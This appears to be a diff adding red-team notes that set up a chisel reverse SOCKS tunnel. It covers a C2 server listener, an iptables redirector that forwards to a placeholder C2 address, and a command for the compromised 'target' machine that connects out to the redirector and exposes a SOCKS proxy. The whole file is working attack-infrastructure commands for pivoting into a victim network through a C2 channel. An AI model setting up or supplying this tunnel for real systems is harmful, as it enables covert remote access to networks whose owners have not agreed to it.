@@ -1,0 +1,10 @@
+### c2 ###
+iptables -I INPUT -p tcp -m tcp --dport 8001 -m comment --comment "SOCKS" -j ACCEPT
+chisel-linux_amd64 server -p 8001 --reverse
+
+### redir ###
+iptables -t nat -A PREROUTING -p tcp --dport 8001 -j DNAT --to-destination <C2_IP>:8001
+iptables -I INPUT -p tcp -m tcp --dport 8001 -m comment --comment "SOCKS" -j ACCEPT
+
+### target ###
+chisel.exe client <REDIR_IP>:8001 R:1080:socks
